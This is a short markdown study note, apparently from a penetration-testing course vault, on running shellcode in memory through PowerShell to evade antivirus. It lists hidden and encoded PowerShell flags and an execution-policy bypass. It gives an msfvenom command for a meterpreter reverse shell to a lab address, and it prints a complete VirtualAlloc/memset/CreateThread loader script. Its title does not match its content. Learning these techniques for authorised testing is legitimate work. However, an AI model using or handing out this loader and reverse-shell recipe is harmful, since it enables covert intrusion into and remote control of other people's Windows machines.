---
id: tools-apache2
tags: ["kali", "tool", "exfiltration", "secure"]
created: 2023-01-12 11:56
---
# tools-apache2

backlinks: [[]]

sources:

- flags
  - -nop            = no profile
  - -w hidden       = shorthand for -WindowStyle hidden
  - -e              = encoded command (base64)

- remember to set the execution property ```shell Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser```





in memory injection
A very powerful feature of PowerShell is its ability to interact with the Windows API.2 This allows us to implement the in-memory injection process in a PowerShell script. One of the main benefits of executing a script rather than a PE is the fact that it is difficult for antivirus manufacturers to determine if the script is malicious or not as it's run inside an interpreter and the script itself isn't executable code. Nevertheless, please keep in mind that some AV products are better than others and handle malicious script detection with more success.3

Furthermore, even if the script is marked as malicious, it can easily be altered. Antivirus software will often look at variable names, comments, and logic, all of which can be changed without the need to re-compile anything.

The script starts by importing VirtualAlloc4 and CreateThread5 from kernel32.dll as well as memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively. Once again, notice that we are allocating the memory and executing a new thread in the current process (powershell.exe), rather than a remote one.

The script then allocates a block of memory using VirtualAlloc, takes each byte of the payload stored in the $sc byte array, and writes it to our newly allocated memory block using memset:

As a final step, our in-memory written payload is executed in a separate thread using CreateThread.

<place your shellcode here> gets replaced with output of msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
  Final size of powershell file: 1627 bytes
  [Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5 etc

The resulting output can be copied to the final script after renaming the $buf variable from msfvenom $sc, as required by the script. Our complete script looks like the following:

```shell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };


```